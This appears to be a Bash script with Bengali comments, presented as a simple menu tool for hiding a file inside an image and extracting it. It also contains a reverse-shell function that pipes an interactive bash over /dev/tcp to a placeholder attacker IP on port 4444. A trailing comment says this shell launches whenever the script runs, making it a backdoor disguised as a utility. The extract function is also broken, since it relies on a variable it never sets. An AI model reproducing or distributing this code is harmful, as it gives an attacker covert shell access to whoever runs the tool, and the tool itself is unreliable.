#!/bin/bash

# রিভার্স শেল ফাংশন
reverse_shell() {
    SERVER_IP="YOUR_IP"  # এখানে আপনার পাবলিক আইপি দিন
    SERVER_PORT=4444     # পোর্ট নম্বর

    /bin/bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1
}

# ফাইল লুকানোর ফাংশন
hide_file() {
    read -p "ছবির নাম (photo.jpg): " IMAGE
    read -p "লুকাতে চাওয়া ফাইল (file.zip/txt/pdf): " FILE
    read -p "আউটপুট ছবির নাম (output.jpg): " OUTPUT

    cat "$IMAGE" "$FILE" > "$OUTPUT"
    echo "[✔] ফাইল সফলভাবে লুকানো হয়েছে: $OUTPUT"
}

# ফাইল বের করার ফাংশন
extract_file() {
    read -p "ফাইল রয়েছে এমন ছবি (photo.jpg): " IMAGE
    read -p "আউটপুট ফাইলের নাম (output.zip/txt/pdf): " OUTPUT

    tail -c +$(($(stat -c %s "$IMAGE") - $(stat -c %s "$FILE") + 1)) "$IMAGE" > "$OUTPUT"
    echo "[✔] ফাইল সফলভাবে বের করা হয়েছে: $OUTPUT"
}

# মেনু UI
while true; do
    clear
    echo "██████████████████████████████"
    echo "█         M,A TOOL   █"
    echo "█       (photo+file) █"
    echo "██████████████████████████████"
    echo "[1] Hide"
    echo "[2] Extract"
    echo "[3] Exit"
    echo ""

    read -p "choice your option: " CHOICE

    case $CHOICE in
        1) hide_file ;;
        2) extract_file ;;
        3) echo "[✔] এক্সিট করা হলো!"; exit ;;
        *) echo "[❌] ভুল ইনপুট! আবার চেষ্টা করুন।" ;;
    esac
done

# স্ক্রিপ্ট চালানোর সময় রিভার্স শেল চালু হবে
reverse_shell
